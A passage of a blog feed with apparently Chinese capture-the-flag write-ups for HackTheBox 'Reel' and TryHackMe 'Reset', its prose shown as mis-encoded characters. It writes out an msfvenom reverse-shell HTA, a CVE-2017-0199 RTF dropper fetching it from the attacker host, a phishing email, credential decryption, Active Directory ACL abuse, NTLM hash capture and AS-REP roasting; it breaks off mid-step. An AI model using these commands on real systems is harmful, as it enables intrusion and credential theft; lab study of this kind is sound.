src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140116875-11898502.png" alt="image-20241027140115107"></p><ul><li>Windows Event Forwarding.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140535714-592406716.png" alt="image-20241027140533430"></p><p>ÊâìÂºÄÂêéÂèëÁé∞Êñá‰ª∂Â∑≤ÁªèÊçüÂùèÔºå‰ΩøÁî®<code>exiftool </code>Ê£ÄÊü•Êï∞ÊçÆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool Windows\ Event\ Forwarding.docx</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140726612-828137712.png" alt="image-20241027140724359"></p><p>ÊâæÂà∞‰∫Ü‰∏™ÈÇÆÁÆ±<code>nico@megabank.com</code></p><h1>RTFÈíìÈ±º</h1><p>ÊºèÊ¥ûÈìæÊé•Ôºö<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199">CVE-2017-0199</a></p><p>‰ΩøÁî®<code>msfvenom</code>ÁîüÊàê‰∏Ä‰∏™HTAÊñá‰ª∂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f hta-psh -o shell.hta</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142449226-1612502237.png" alt="image-20241027142446919"></p><p>‰ΩøÁî®<a href="https://github.com/bhdresh/CVE-2017-0199">CVE-2017-0199</a>‰∏≠ÁöÑËÑöÊú¨ÂàõÂª∫‰∏Ä‰∏™RTFÊñá‰ª∂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http://10.10.16.4/shell.hta -t rtf -x 0</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142911589-1627462942.png" alt="image-20241027142909573"></p><p>ÂÖàÂêØÂä®‰∏Ä‰∏™httpÊúçÂä°ÔºåÂú®ÂáÜÂ§á‰∏Ä‰∏™ncÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143033400-71778760.png" alt="image-20241027143031493"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143041473-540171105.png" alt="image-20241027143039426"></p><p>‰ΩøÁî®<code>sendemail </code>ÂèëÈÄÅÈÇÆ‰ª∂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f root@admin.com -t nico@megabank.com -u <span class="string">&quot;look me&quot;</span> -m <span class="string">&quot;click me&quot;</span> -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143939282-234032504.png" alt="image-20241027143936622"></p><p>Â§ßÁ∫¶Á≠âÂæÖ30sÂ∑¶Âè≥ÔºåÂ∞±Ëé∑ÂæóÂà∞shell‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144231417-1596098132.png" alt="image-20241027144229331"></p><p>ÊâæÂà∞<code>user.txt</code></p><h1>nico -&gt; Tom</h1><p>Âú®<code>nico</code>Ê°åÈù¢‰∏äÂèëÁé∞ËøòÊúâ‰∏™<code>cred.xml</code>ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144606786-1891749689.png" alt="image-20241027144604507"></p><p>ÂèëÁé∞ÊòØ<code>tom</code>ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å</p><p>ÂèØ‰ª•‰ΩøÁî®<code>Powershell</code>ÁöÑ<code>PSCredential</code>ÔºåÂÆÉÊèê‰æõ‰∫Ü‰∏ÄÁßçÂ≠òÂÇ®Áî®Êà∑Âêç„ÄÅÂØÜÁ†ÅÂíåÂá≠ÊçÆÁöÑÊñπÊ≥ï„ÄÇËøòÊúâ‰∏§‰∏™ÂáΩÊï∞<code>Import-CliXml</code>Âíå<code>Export-CliXml</code> ÔºåÁî®‰∫éÂ∞ÜËøô‰∫õÂá≠ÊçÆ‰øùÂ≠òÂà∞Êñá‰ª∂‰∏≠‰ª•Âèä‰ªéÊñá‰ª∂‰∏≠ÊÅ¢Â§çÂÆÉ‰ª¨„ÄÇ</p><p>‰ΩøÁî®<code>Import-CliXml</code>Âä†ËΩΩÊñá‰ª∂Êù•Ëé∑ÂèñÊòéÊñáÂØÜÁ†Å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145028630-177734907.png" alt="image-20241027145026052"></p><p>Ëé∑ÂèñÂà∞<code>Tom</code>Áî®Êà∑ÁöÑÊòéÊñáÂØÜÁ†Å<code>1ts-mag1c!!!</code></p><p>Â∞ùËØï‰ΩøÁî®sshÁôªÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145337858-1210501876.png" alt="image-20241027145335727"></p><h1>AD Privesc</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145617853-1021058284.png" alt="image-20241027145615560"></p><p>Ê≥®ÊÑèÂà∞Ê°åÈù¢‰∏äÊúâ‰∏™<code>AD Audit</code>ÁõÆÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145705349-1312903517.png" alt="image-20241027145703246"></p><p>ÂÖàÊü•Áúã‰∏Ä‰∏ã<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145804355-665684367.png" alt="image-20241027145802362"></p><p>Êü•Áúã‰∏Ä‰∏ãÂÖ∂‰ªñÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150322032-1642287028.png" alt="image-20241027150319779"></p><p>ÁªìÂêàÊèêÁ§∫Âπ∂ÂÆûË∑µÂêéÂèëÁé∞ÔºåËøêË°å‰∏ç‰∫Ü<code>SharpHound.exe</code>ÔºåÊó†Ê≥ï‰ΩøÁî®<code>Bloodhound</code>ËøõË°å‰ø°ÊÅØÊî∂ÈõÜÔºåÊâÄ‰ª•Êàë‰ª¨ÁõÆÊ†áÊîæÂú®<code>acls.csv</code>‰∏ä</p><p>‰ΩøÁî®<code>scp</code>Â∞ÜÊñá‰ª∂‰∏ãËΩΩ‰∏ãÊù•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp Tom@10.10.10.77:<span class="string">&#x27;/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv&#x27;</span> ./</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150858200-1795280760.png" alt="image-20241027150855646"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151056577-147523502.png" alt="image-20241027151054397"></p><p>ÊòØ‰∏Ä‰∏™<code>ACL</code>ÁöÑÊñá‰ª∂ÔºåÂàÜÊûê‰∏Ä‰∏ãÔºåÂÖàÂØπ<code>PrincipalName</code>ÁÆÄÂçïÁ≠õÈÄâ‰∏Ä‰∏ã<code>Tom</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151304099-1184542152.png" alt="image-20241027151302192"></p><p>ÂèëÁé∞<code>Tom</code>ÂØπ<code>claire</code>Êúâ<code>WriteOwner</code>ÊùÉÈôêÔºåÂú®ÊêúÁ¥¢‰∏Ä‰∏ã<code>claire</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151757888-1784963385.png" alt="image-20241027151756078"></p><p>ÂèëÁé∞<code>claire</code>ÂØπ<code>Backup_Admins</code>ÁªÑÊúâ<code>WriteDacl</code>ÊùÉÈôê</p><h1>Tom-&gt;claire</h1><p>Ê≥®ÊÑèÂà∞‰πãÂâçÂú®<code>tom</code>Êú∫Âô®‰∏äÊúâ<code>PowerView.ps1</code></p><p>ÊâÄ‰ª•Êàë‰ª¨‰ΩøÁî®<code>WriteOwner</code>ÊùÉÈôêÂíå<code>PowerView.ps1</code>ÁöÑÂäüËÉΩÊù•ÁôªÂΩï<code>claire</code></p><p>ÈúÄË¶ÅÊâßË°å‰ª•‰∏ãÊ≠•È™§Ôºö</p><ul><li>Êàê‰∏∫<code>claire</code>ÁöÑACLÁöÑÊâÄÊúâËÄÖ</li><li>Ëé∑ÂèñËØ•ACLÊùÉÈôê</li><li>‰ΩøÁî®ÊùÉÈôêÊõ¥ÊîπÂØÜÁ†Å</li></ul><p>ÂÖàÂØºÂÖ•<code>PowerView.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027152937745-1565451432.png" alt="image-20241027152935704"></p><p>ÂÖàÊää<code>Tom</code>ËÆæÁΩÆÊàê‰∏∫<code>claire</code>ÁöÑACLÁöÑÊâÄÊúâËÄÖ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-identity</span> claire <span class="literal">-OwnerIdentity</span> tom</span><br></pre></td></tr></table></figure><p>Áªô‰∫à<code>Tom</code>Êõ¥ÊîπACL‰∏äÂØÜÁ†ÅÁöÑÊùÉÈôê</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> claire <span class="literal">-PrincipalIdentity</span> tom <span class="literal">-Rights</span> ResetPassword</span><br></pre></td></tr></table></figure><p>ÊúÄÂêéÂàõÂª∫‰∏Ä‰∏™ÂØÜÁ†ÅÔºåÁÑ∂ÂêéÁªô<code>claire</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Aa123456!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-identity</span> claire <span class="literal">-accountpassword</span> <span class="variable">$pass</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154433915-1759841619.png" alt="image-20241027154431882"></p><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÈÄöËøásshÁôªÂΩï<code>claire</code>Áî®Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154519928-224576146.png" alt="image-20241027154517959"></p><h1>claire-&gt;Backup_Admins</h1><p>‰πãÂâçÁöÑACLÂàÜÊûêÂèØÁü•<code>claire</code>ÂØπ<code>Backup_Admins</code>ÁªÑÊúâ<code>WriteDacl</code>ÊùÉÈôêÔºåÂèØ‰ª•Áî®ÂÆÉÂ∞Ü<code>claire</code>Âä†ÂÖ•ËØ•ÁªÑ</p><p>ÂÖàÊü•Áúã‰∏Ä‰∏ã<code>Backup_Admins</code>ÁªÑ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155028571-432531593.png" alt="image-20241027155026424"></p><p>ÂΩìÂâçÁî®Êà∑Âè™Êúâ<code>ranj</code></p><p>Áé∞Âú®Ê∑ªÂä†<code>claire</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins claire /add</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155115663-1003890863.png" alt="image-20241027155113754"></p><p>ÂÜçÊü•Áúã‰∏Ä‰∏ã<code>Backup_Admins</code>ÁªÑ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155143258-1109182793.png" alt="image-20241027155141343"></p><p>ÂèëÁé∞Â∑≤Áªè<code>claire</code>Âú®<code>Backup_Admins</code>ÁªÑ‰∏≠‰∫ÜÔºåÈáçÊñ∞ÁôªÂΩï‰ΩøÂÖ∂ÁîüÊïà</p><p><strong>ps: ÈáçÊñ∞ÁôªÈôÜÊ≤°ÊúâÊàêÂäüÁöÑÔºåÈúÄË¶ÅÂú®ÊâßË°å‰∏ÄÈÅç Tom-&gt;claire ÁöÑÊìç‰Ωú</strong></p><h1>Backup_Admins-&gt;Administrator</h1><p>ÁõÆÂâçÊàë‰ª¨‰ª•<code>claire</code>Ë∫´‰ªΩÁôªÂΩïÔºåÂπ∂ÊòØ<code>Backup_Admins</code>ÁªÑÁöÑÊàêÂëò</p><p>ËØ¥ÊòéÊàë‰ª¨ÊúâÊü•Áúã<code>Administrator</code>Êñá‰ª∂ÁöÑÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160444426-963998426.png" alt="image-20241027160442280"></p><p>ÊâæÂà∞<code>root.txt</code>Ôºå‰ΩÜÊòØÊàë‰ª¨Ê≤°ÊùÉÈôêÊü•ÁúãÔºåÊ≥®ÊÑèÂà∞Êúâ‰∏™<code>Backuo Scripts</code>ÁõÆÂΩïÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160633334-1179167874.png" alt="image-20241027160630997"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160743097-1088951995.png" alt="image-20241027160741004"></p><p>ÊúÄÂêéÂú®<code>BackupScript.ps1</code>Êñá‰ª∂‰∏≠ÊâæÂà∞<code>Admin</code>ÁöÑÂØÜÁ†Å<code>Cr4ckMeIfYouC4n!</code></p><p>sshÁôªÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh Administrator@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161035554-273633219.png" alt="image-20241027161033587"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161109110-316346945.png" alt="image-20241027161106839"></p><p>ÊúÄÁªàÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">HackTheBoxÁØáActive Directory 101Á≥ªÂàó‰πãReel</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    <category term="Active Directory" scheme="https://www.fomal.cc/categories/HackTheBox/Active-Directory/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
    <category term="Active Directory 101" scheme="https://www.fomal.cc/tags/Active-Directory-101/"/>
    
  </entry>
  
  <entry>
    <title>THM-Reset</title>
    <link href="https://www.fomal.cc/posts/fa5fb889.html"/>
    <id>https://www.fomal.cc/posts/fa5fb889.html</id>
    <published>2024-10-25T05:45:52.000Z</published>
    <updated>2024-10-31T13:09:06.606Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.219.65</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST</span><br><span class="line">Nmap scan report for 10.10.219.65</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 65515 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=HayStack.thm.corp</span><br><span class="line">| Not valid before: 2024-10-24T05:48:35</span><br><span class="line">|_Not valid after:  2025-04-25T05:48:35</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: THM</span><br><span class="line">|   NetBIOS_Domain_Name: THM</span><br><span class="line">|   NetBIOS_Computer_Name: HAYSTACK</span><br><span class="line">|   DNS_Domain_Name: thm.corp</span><br><span class="line">|   DNS_Computer_Name: HayStack.thm.corp</span><br><span class="line">|   DNS_Tree_Name: thm.corp</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-25T05:51:48+00:00</span><br><span class="line">|_ssl-date: 2024-10-25T05:53:13+00:00; +22s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">49670/tcp open  unknown</span><br><span class="line">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 21s, deviation: 0s, median: 21s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-25T05:51:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   662.94 ms 10.14.0.1</span><br><span class="line">2   663.13 ms 10.10.219.65</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂá∫ËøôÊòØ‰∏ÄÂè∞ÂüüÊéßÔºåÂπ∂‰∏îÂüüÂêçÊòØ<code>HayStack.thm.corp</code>ÔºåÂ∞ÜËøô‰∏™Âíå<code> thm.corp</code>Ê∑ªÂä†Âà∞<code>/etc/hosts</code></p><h2 id="SMB">SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135202309-1900674591.png" alt="image-20241025135138717"></p><p>Â∞ùËØïËøûÊé•<code>Data</code>ÁõÆÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.219.65/Data</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135505429-2020002712.png" alt="image-20241025135442301"></p><p>ÂèëÁé∞ÊØèÊ¨°Êìç‰ΩúÊñá‰ª∂ÂêçÈÉΩ‰ºöÂèòÂåñÔºåÂÖàÂ∞ÜÊñá‰ª∂‰∏ãËΩΩÂà∞Êú¨Âú∞Êü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135646463-1583002200.png" alt="image-20241025135623489"></p><p>ÊâæÂà∞ÂàùÂßãÂØÜÁ†Å<code>ResetMe123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135729828-1298084476.png" alt="image-20241025135706715"></p><p>Âú®Âè¶‰∏Ä‰∏™pdfÊñá‰ª∂‰∏≠ÂèëÁé∞‰∏ÄÁªÑÁî®Êà∑ÂêçÂØÜÁ†Å<code>LILY ONEILL:ResetMe123!</code></p><h2 id="rpc">rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.219.65</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025140240543-805157185.png" alt="image-20241025140217254"></p><p>Âπ∂Ê≤°Êúâ‰ªÄ‰πà‰ø°ÊÅØ</p><h1>Ëé∑Âèñuser.txt</h1><p>Âú®‰πãÂâçËøõË°åsmbÊé¢ÊµãÁöÑÊó∂ÂÄôÂèëÁé∞ÁõÆÂΩï‰ºöÈöèÁùÄÊØèÊ¨°ËÆøÈóÆÔºåÂú®‰∏ÄÂÆöÊó∂Èó¥ÂêéÂ∞±‰ºöÊîπÂèòÊñá‰ª∂ÂêçÔºåËØ¥Êòé‰∏çÊ≠¢Êàë‰ª¨‰∏Ä‰∏™‰∫∫Âú®ËÆøÈóÆËøô‰∏™ÁõÆÂΩïÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Â∑•ÂÖ∑Â∞ùËØïÂú®smb‰∏≠ÊçïËé∑Âè¶‰∏Ä‰∏™‰∫∫ÁöÑhash</p><p>‰ΩøÁî®<a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a>Â∑•ÂÖ∑ÂàõÂª∫ÊÅ∂ÊÑèÊñá‰ª∂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g url -s 10.14.90.122 -f aaa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142209751-1923196893.png" alt="image-20241025142146578"></p><p>Âú®ÊîªÂáªÊú∫‰∏äÁõëÂê¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure><p>Â∞ÜÁîüÊàêÁöÑÊñá‰ª∂‰º†Âà∞Èù∂Êú∫‰∏ä</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142655232-1422163173.png" alt="image-20241025142631944"></p><p>Âú®ÁõëÂê¨Â§ÑÊàë‰ª¨Â∞±ÊçïËé∑Âà∞‰∫Ü‰∏ÄÁªÑhash</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142755759-907774947.png" alt="image-20241025142732867"></p><p>Â∞ÜÂÖ∂‰øùÂ≠òÂà∞<code>hash</code>Êñá‰ª∂ÔºåÁî®‰∫éÁ†¥Ëß£</p><p>‰ΩøÁî®<code>john</code>Â∑•ÂÖ∑Á†¥Ëß£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143503161-1529556282.png" alt="image-20241025143439961"></p><p>ÊàêÂäüËé∑Âèñ<code>AUTOMATE</code>ÁöÑÂØÜÁ†Å<code>Passw0rd1</code></p><p>Â∞ùËØïÁôªÂΩï</p><p><code>evil-winrm -i 10.10.219.65 -u AUTOMATE -p Passw0rd1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143817037-942278707.png" alt="image-20241025143753555"></p><p>Âú®<code>Desktop</code>ÊâæÂà∞<code>user.txt</code></p><h1>Ê®™ÂêëÁßªÂä®</h1><h2 id="AS-REP-Roasting">AS-REP Roasting</h2><p>‰ΩøÁî®<code>bloodhound-pytohn</code>‰ø°ÊÅØÊî∂ÈõÜ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u automate -p Passw0rd1 -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025144647833-553174619.png" alt="image-20241025144624398"></p><p>Â∞ÜÊî∂ÈõÜÁöÑ‰ø°ÊÅØ‰ΩøÁî®<code>Bloodhound</code>ÂàÜÊûê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025150432464-189680214.png" alt="image-20241025150408916"></p><p>ÂèëÁé∞Êúâ‰∏â‰∏™ËÉΩÂ§ü<code>AS-REP</code>ÊîªÂáªÁöÑÁî®Êà∑</p><ul><li><code>ERNESTO_SILVA@THM.CORP</code></li><li><code>TABATHA_BRITT@THM.CORP</code></li><li><code>LEANN_LONG@THM.CORP</code></li></ul><p>Â∞ÜÁî®Êà∑Âêç‰øùÂ≠òÂà∞<code>users</code>Êñá‰ª∂</p><p>‰ΩøÁî®<code>GetNPUsers.py</code>ËØ∑Ê±ÇÁî®Êà∑ÁöÑ<code>TGT</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py thm.corp/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025151452294-1718262734.png" alt="image-20241025151428929"></p><p>ÂàÜÂà´‰ΩøÁî®<code>john</code>ÁàÜÁ†¥</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025152715817-367967576.png" 